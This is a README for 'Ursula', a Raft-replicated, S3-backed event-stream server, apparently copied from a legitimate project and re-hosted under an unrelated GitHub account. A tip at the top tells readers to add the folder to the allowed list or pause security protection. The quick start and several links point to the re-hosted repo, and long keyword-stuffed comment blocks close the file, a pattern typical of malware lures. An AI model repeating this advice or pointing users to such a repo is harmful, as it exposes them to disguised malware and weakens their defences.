# Ursula


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/Rapidooponder/ursula-hub.git
cd ursula-hub
cargo build --release
cargo run
```


[![Crates.io](https://img.shields.io/crates/v/ursula.svg)](https://crates.io/crates/ursula)
[![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

Docs: **[ursula.tonbo.io](https://ursula.tonbo.io)**

Ursula is a self-hosted, distributed server for the replayable, append-only event timelines behind document edits, agent runs, workflows, and chat. It speaks the [Durable Streams Protocol](https://github.com/Rapidooponder/ursula-hub) over plain HTTP and SSE.

## What Ursula keeps

Event streams live outside the broker network. Document editors, agents, and durable workflows need timelines that browsers, mobile apps, and serverless functions can read, write, and tail over the public internet. That asks for HTTP-native, distributed, S3-backed infrastructure, not the SDK-locked, single-network shape Kafka-style brokers were built for.

The [Durable Streams Protocol](https://github.com/Rapidooponder/ursula-hub) nails that wire format, but its reference server is a single process: a node loss is data loss. The other servers we evaluated each force you to give up one of four things this primitive deserves to keep:

- **Open-source self-hosting.**
- **Low write latency** (sub-50 ms P99 appends, no batching window required).
- **Plain S3 economics** (cold tier on standard S3, no S3 Express tier, no per-GB SaaS markup).
- **Quorum-replicated durability** (acknowledged writes survive a single-node failure).

Ursula keeps all four.

Full design intent: [Why Ursula](https://ursula.tonbo.io/docs/why-ursula) · [How Ursula compares](https://ursula.tonbo.io/docs/competitive-comparison).


## Architecture

Three or five Ursula processes act as one durable-streams server. A stream hashes to one Raft group, that group has one replica on each voter node, and the same group ID is owned by a deterministic core on every node. Groups replicate independently; there is no cross-group transaction path.

```text
                  HTTP / SSE clients
        |                 |                 |
        v                 v                 v
        route(bucket_id, stream_id)
        |
        v
  +-----------+     +-----------+     +-----------+
  |  node 1   |<--->|  node 2   |<--->|  node 3   |
  | HTTP/gRPC |     | HTTP/gRPC |     | HTTP/gRPC |
  |           |     |           |     |           |
  | core 0    |     | core 0    |     | core 0    |
  |  group 0* |<--->|  group 0  |<--->|  group 0  |
  |  group 3  |<--->|  group 3* |<--->|  group 3  |
  |           |     |           |     |           |
  | core 1    |     | core 1    |     | core 1    |
  |  group 1  |<--->|  group 1* |<--->|  group 1  |
  |  group 4* |<--->|  group 4  |<--->|  group 4  |
  |           |     |           |     |           |
  | core 2    |     | core 2    |     | core 2    |
  |  group 2  |<--->|  group 2  |<--->|  group 2* |
  |  group 5  |<--->|  group 5  |<--->|  group 5* |
  +-----+-----+     +-----+-----+     +-----+-----+
        |                 |                 |
        +-----------------+-----------------+
                          |  background flush
                          v
                   +--------------+
                   | S3 cold tier |
                   +--------------+

  * leader for that Raft group, leadership can differ per group.
```

- **[Thread-per-core](https://seastar.io/shared-nothing/), [multi-Raft](https://tikv.org/deep-dive/scalability/multi-raft/).**

  Each stream hashes to one Raft group and owner core, so cores own disjoint groups with no shared mutable state on the hot path.

- **Per-group node-to-node Raft.**

  Every node hosts replicas for the same configured groups, and those replicas exchange gRPC Raft RPCs while non-leader HTTP writes forward to the current group leader.

- **Hot ring on the write path.**

  Appends commit into an in-memory ring and Raft log while background flushers move older committed chunks to S3.

- **Independent Raft groups.**

  Each group has its own raft instance, log, state machine, hot ring, watchers, and cold-flush budget, with no cross-group commit protocol.

- **Stateless HTTP front door.**

  [axum](https://github.com/tokio-rs/axum) parses, routes, and renders the protocol while stream ownership and mutable state stay inside the owning group actor.

Across nodes, writes are leader-serialized within one group and acknowledged after a majority of that group's replicas persist and apply the command. Full design: [Architecture overview](https://ursula.tonbo.io/docs/architecture/overview).

## Benchmark

On EC2 (3 × `c7g.4xlarge`, Raft quorum), Ursula sustains **35.2k appends/sec** at 500 streams (5.9× single-node Durable Streams, 5.2× S2 Lite, both on 1 × `c7g.4xlarge`) and delivers SSE fan-out to 1000 subscribers at **6.1 ms p99** (160× faster than Durable Streams, 18× faster than S2 Lite). Apples-to-apples methodology, full charts, replay and latency cuts: [ursula.tonbo.io/benchmark](https://ursula.tonbo.io/benchmark).

## Roadmap

The `v0.1.x` line is a working prototype. Next on deck:

- [ ] **`if-match` conditional append.**

  Optimistic concurrency control on the append path. An `if-match: <offset>` header lets a writer commit only when the stream tip hasn't moved, so concurrent writers can coordinate without an external lock. The semantics need to land in Ursula's HTTP adapter and Raft state machine.

- [ ] **Stateless WASM compute over streams.**

  A planned Ursula extension: bind a deterministic WASM module to a stream so the server can materialize per-stream state, enabling automatic compaction and `410 Gone` bootstrap recovery without application-side checkpointing.

- [ ] **Dynamic membership.**

  Online voter / learner reconfiguration and orchestrated rolling membership changes (today's clusters are static).

- [ ] **Backup and restore tooling.**

  A supported recovery path for total-cluster loss from the S3 cold tier (today there is none).

- [ ] **Client SDKs.**

  Ergonomic Rust and TypeScript clients on top of the HTTP API.

## Credits

- **[ElectricSQL](https://electric-sql.com/)** for the original Durable Streams Protocol that Ursula implements.
- **[Loro](https://loro.dev/)** for the snapshot and replay extension design that Ursula adopted on top of the base protocol.

## License

Apache 2.0. See [LICENSE](LICENSE).

Built by [Tonbo](https://tonbo.io/), an open-source storage team.


<!-- rust cargo crate systems programming performance windows linux macos -->
<!-- ursula-hub - tool utility software - download install setup -->
<!-- compile simple ursula-hub | ursula hub workflow | source code ursula-hub debugger | tar.gz ursula-hub compressor | ursula hub handbook | debian open source ursula-hub | use ursula-hub sdk | source code modern ursula-hub uploader | easy ursula-hub mobile | how to download ursula-hub application | customizable ursula-hub cli | demo ursula-hub optimizer | offline ursula-hub | how to use portable ursula-hub | get modern ursula-hub plugin | build ursula-hub | configurable ursula-hub cli | demo ursula-hub builder | execute high performance ursula-hub | how to run ursula-hub gui | ursula-hub addon | modern ursula-hub reader | ursula-hub cli | top ursula hub | run ursula-hub engine | ursula-hub generator | lightweight ursula-hub downloader | example ursula-hub web | run on mac configurable ursula-hub gui | fedora best ursula-hub scanner | local ursula-hub scanner | fast ursula-hub reader | sample ursula-hub program | build ursula-hub alternative | github ursula-hub converter | how to build ursula-hub logger | top ursula-hub | ursula hub docker | ursula hub review | wiki ursula-hub generator | production ready ursula-hub converter | ursula hub kubernetes | ursula hub saas | reliable ursula-hub analyzer | install ursula-hub gui | tutorial ursula-hub encoder | extensible ursula-hub | advanced ursula-hub builder | git clone modern ursula-hub | launch ursula-hub -->
<!-- getting started ursula-hub | use ursula-hub extractor | safe ursula-hub fork | docs ursula-hub mirror | ursula-hub gui | windows ursula-hub package | 2026 ursula-hub fork | native ursula-hub extension | latest version ursula-hub editor | lightweight ursula-hub platform | ursula-hub downloader | easy ursula-hub | how to deploy ursula-hub scanner | ursula-hub app | best ursula-hub builder | walkthrough fast ursula-hub | how to deploy ursula-hub extractor | run on mac ursula-hub web | online ursula-hub mobile | github ursula-hub desktop | top ursula-hub tool | modular ursula-hub api | latest version ursula-hub replacement | download for windows ursula-hub copy | top ursula-hub monitor | cross platform ursula-hub engine | walkthrough ursula-hub tracker | fedora ursula-hub engine | getting started ursula-hub sdk | centos ursula-hub encoder | low latency ursula-hub reader | ursula hub alternative | updated ursula-hub | arch ursula-hub mobile | ursula-hub viewer | ursula-hub optimizer | ursula-hub copy | free download customizable ursula-hub | examples ursula-hub software | minimal ursula-hub copy | latest version ursula-hub extractor | ursula hub test | how to build configurable ursula-hub | compile ursula-hub | powerful ursula-hub | download ursula-hub mobile | configure ursula-hub utility | start ursula-hub tool | build ursula-hub uploader | new version ursula-hub checker -->
<!-- open source ursula-hub gui | example ursula-hub | walkthrough fast ursula-hub checker | best ursula-hub program | how to setup ursula-hub debugger | best ursula-hub copy | get ursula-hub tester | new version secure ursula-hub | modular ursula-hub app | 2025 ursula-hub | run on windows ursula-hub | walkthrough reliable ursula-hub application | powerful ursula-hub sdk | portable ursula-hub | zip ursula-hub plugin | new version safe ursula-hub plugin | download for mac portable ursula-hub | open source local ursula-hub | lightweight ursula-hub tester | how to download secure ursula-hub alternative | quickstart ursula-hub module | build fast ursula-hub | open source ursula-hub extractor | how to configure ursula-hub | how to install ursula-hub optimizer | execute ursula-hub | walkthrough portable ursula-hub binding | ubuntu ursula-hub mobile | configure cross platform ursula-hub web | stable ursula-hub checker | simple ursula-hub api | configurable ursula-hub alternative | modern ursula-hub platform | production ready ursula-hub tool | execute ursula-hub fork | how to download open source ursula-hub | ubuntu modern ursula-hub | launch online ursula-hub | cross platform ursula-hub scanner | ursula-hub encoder | native ursula-hub parser | tar.gz ursula-hub engine | run on linux ursula-hub desktop | portable ursula-hub service | 2025 powerful ursula-hub | zip ursula-hub checker | ursula-hub framework | open source ursula-hub extension | ursula hub article | open configurable ursula-hub -->
<!-- github ursula-hub | guide ursula-hub debugger | ursula-hub debugger | walkthrough ursula-hub creator | ursula-hub tracker | powerful ursula-hub converter | updated ursula-hub engine | run on linux ursula-hub copy | how to use ursula-hub checker | ursula-hub application | docs ursula-hub engine | how to install ursula-hub copy | tutorial reliable ursula-hub | how to setup ursula-hub | linux ursula-hub | arch lightweight ursula-hub encoder | start free ursula-hub | ursula-hub server | powerful ursula-hub framework | tutorial ursula-hub | safe ursula-hub tester | setup ursula-hub | wiki ursula-hub builder | simple ursula-hub copy | github ursula-hub package | fast ursula-hub editor | documentation fast ursula-hub | online ursula-hub plugin | ubuntu ursula-hub compressor | open ursula-hub validator | deploy ursula-hub | wiki stable ursula-hub replacement | linux ursula-hub client | how to use ursula-hub | ursula hub download | self hosted ursula-hub clone | ursula-hub program | download for windows ursula-hub | how to build ursula-hub api | ursula-hub mirror | centos simple ursula-hub | beginner reliable ursula-hub utility | centos ursula-hub engine | easy ursula-hub port | beginner modern ursula-hub | setup portable ursula-hub | how to install ursula-hub framework | stable ursula-hub wrapper | tutorial ursula-hub package | how to deploy online ursula-hub parser -->
<!-- tutorial fast ursula-hub | debian advanced ursula-hub monitor | stable ursula-hub library | modern ursula-hub web | production ready ursula-hub addon | run on linux ursula-hub addon | latest version ursula-hub creator | download self hosted ursula-hub | ursula-hub software | latest version ursula-hub extension | docs ursula-hub parser | secure ursula-hub library | source code ursula-hub scanner | debian ursula-hub | 2025 ursula-hub server | download for linux ursula-hub utility | run on mac stable ursula-hub | ursula-hub library | ubuntu ursula-hub optimizer | best ursula-hub | how to download ursula-hub | ursula hub benchmark | use configurable ursula-hub | install ursula-hub engine | run ursula-hub alternative | quickstart ursula-hub tool | extensible ursula-hub scanner | documentation ursula-hub server | open source ursula-hub cli | documentation ursula-hub | zip ursula-hub mobile | download customizable ursula-hub | compile ursula-hub logger | portable ursula-hub downloader | quickstart ursula-hub parser | github ursula-hub builder | guide ursula-hub port | download ursula-hub fork | start ursula-hub | self hosted ursula-hub desktop | easy ursula-hub debugger | configurable ursula-hub tester | download for mac ursula-hub extractor | ursula-hub plugin | ursula-hub tool | production ready ursula-hub application | lightweight ursula-hub viewer | how to use ursula-hub uploader | self hosted ursula-hub sdk | examples ursula-hub fork -->
<!-- best ursula-hub creator | download for linux ursula-hub logger | how to build ursula-hub generator | native ursula-hub monitor | source code ursula-hub port | online ursula-hub program | online ursula-hub fork | 2026 configurable ursula-hub | windows ursula-hub mobile | free ursula-hub copy | configure ursula-hub | open source ursula-hub fork | macos ursula-hub wrapper | windows stable ursula-hub | customizable ursula-hub | portable ursula-hub replacement | start local ursula-hub | use ursula-hub decoder | run on mac ursula-hub | download for windows fast ursula-hub client | modular ursula-hub encoder | secure ursula-hub clone | ursula-hub reader | guide offline ursula-hub framework | linux ursula-hub library | portable ursula-hub wrapper | beginner ursula-hub client | ursula-hub validator | how to configure ursula-hub package | easy ursula-hub parser | open source top ursula-hub application | powerful ursula-hub viewer | safe ursula-hub encoder | stable ursula-hub | how to download ursula-hub port | lightweight ursula-hub | get ursula-hub framework | macos self hosted ursula-hub analyzer | launch extensible ursula-hub | native ursula-hub software | online ursula-hub sdk | quickstart offline ursula-hub library | wiki modern ursula-hub compressor | configurable ursula-hub | github ursula-hub tool | run ursula-hub api | production ready ursula-hub | ursula-hub service | wiki ursula-hub validator | how to build ursula-hub tracker -->
<!-- easy ursula-hub app | how to use ursula-hub framework | download for mac ursula-hub | new version ursula-hub module | updated ursula-hub optimizer | documentation safe ursula-hub | best ursula-hub wrapper | how to setup top ursula-hub api | how to deploy ursula-hub alternative | download ursula-hub binding | tar.gz ursula-hub analyzer | top ursula-hub binding | windows ursula-hub mirror | new version ursula-hub web | new version ursula-hub | top ursula-hub web | sample ursula-hub alternative | 2025 ursula-hub extractor | advanced ursula-hub scanner | modern ursula-hub tester | launch ursula-hub app | open source ursula-hub creator | 2025 ursula-hub monitor | top ursula-hub module | ursula-hub engine | cross platform ursula-hub server | quick start lightweight ursula-hub | top ursula-hub analyzer | safe ursula-hub decoder | configure ursula-hub package | reliable ursula-hub tracker | how to deploy ursula-hub cli | safe ursula-hub sdk | documentation customizable ursula-hub | run on windows ursula-hub library | ursula-hub builder | ursula-hub client | configure ursula-hub program | quick start ursula-hub cli | setup ursula-hub wrapper | configurable ursula-hub uploader | download for linux configurable ursula-hub | example ursula-hub port | modular ursula-hub extractor | ursula-hub desktop | ursula hub fix | run on linux ursula-hub wrapper | launch fast ursula-hub | start ursula-hub app | ursula-hub compressor -->
<!-- get ursula-hub | how to setup ursula-hub clone | ursula-hub alternative | portable ursula-hub app | docs ursula-hub alternative | examples ursula-hub framework | open source ursula-hub | modular ursula-hub analyzer | simple ursula-hub | download for linux top ursula-hub encoder | local ursula-hub reader | how to setup ursula-hub downloader | build ursula-hub sdk | modular ursula-hub mobile | fedora lightweight ursula-hub | ursula-hub parser | best ursula-hub app | top ursula-hub app | free download ursula-hub | deploy ursula-hub tracker | use reliable ursula-hub | compile ursula-hub web | safe ursula-hub creator | run on mac ursula-hub debugger | high performance ursula-hub | download for linux production ready ursula-hub service | self hosted ursula-hub validator | getting started open source ursula-hub | open source configurable ursula-hub package | sample online ursula-hub extension | how to download ursula-hub platform | secure ursula-hub compressor | launch ursula-hub port | secure ursula-hub downloader | powerful ursula-hub reader | documentation ursula-hub sdk | open source offline ursula-hub | execute ursula-hub validator | extensible ursula-hub generator | linux ursula-hub cli | setup ursula-hub engine | getting started ursula-hub encoder | portable ursula-hub tracker | 2025 configurable ursula-hub | deploy reliable ursula-hub | ursula-hub logger | tar.gz ursula-hub | ursula-hub package | configurable ursula-hub decoder | best ursula-hub cli -->
<!-- secure ursula-hub program | debian ursula-hub monitor | beginner production ready ursula-hub | download ursula-hub sdk | open ursula-hub port | ursula hub guide | ursula-hub extractor | centos ursula-hub server | fedora ursula-hub desktop | guide ursula-hub | ursula-hub analyzer | ursula-hub editor | modern ursula-hub | ursula hub cheat sheet | ursula hub ci cd | git clone ursula-hub | get configurable ursula-hub converter | advanced ursula-hub addon | git clone ursula-hub converter | ursula-hub binding | portable ursula-hub gui | reliable ursula-hub client | tutorial ursula-hub validator | centos ursula-hub cli | how to build ursula-hub scanner | start fast ursula-hub | production ready ursula-hub api | compile best ursula-hub | build top ursula-hub | how to download ursula-hub web | arch ursula-hub | top ursula-hub plugin | ursula hub blog | fedora portable ursula-hub | run on windows ursula-hub program | how to configure advanced ursula-hub | walkthrough ursula-hub tool | tar.gz ursula-hub uploader | run on linux modular ursula-hub software | launch local ursula-hub | compile ursula-hub app | debian portable ursula-hub app | native ursula-hub engine | ursula-hub platform | documentation open source ursula-hub | walkthrough powerful ursula-hub | open ursula-hub application | guide ursula-hub platform | run on windows self hosted ursula-hub | fast ursula-hub -->
<!-- start ursula-hub encoder | zip ursula-hub module | configurable ursula-hub module | github ursula-hub downloader | local ursula-hub | run on mac ursula-hub creator | how to deploy ursula-hub | self hosted ursula-hub | ursula-hub port | arch ursula-hub sdk | free ursula-hub tester | open low latency ursula-hub | ursula hub best practice | 2026 ursula-hub port | secure ursula-hub | customizable ursula-hub binding | ursula-hub utility | centos ursula-hub tracker | deploy ursula-hub plugin | free top ursula-hub scanner | top ursula-hub editor | docs ursula-hub | stable ursula-hub tracker | tutorial ursula-hub checker | fedora ursula-hub program | free ursula-hub software | quick start simple ursula-hub | deploy top ursula-hub | wiki lightweight ursula-hub | how to run ursula-hub api | arch ursula-hub copy | configurable ursula-hub desktop | run ursula-hub | top ursula-hub tracker | ursula-hub checker | free download ursula-hub engine | free download ursula-hub extension | free ursula-hub analyzer | how to download ursula-hub analyzer | updated best ursula-hub monitor | customizable ursula-hub package | open source ursula-hub copy | install ursula-hub extension | ursula hub workshop | source code ursula-hub builder | windows safe ursula-hub compressor | run on windows easy ursula-hub | git clone ursula-hub binding | modular ursula-hub debugger | low latency ursula-hub -->

<!-- Last updated: 2026-06-09 19:23:26 -->
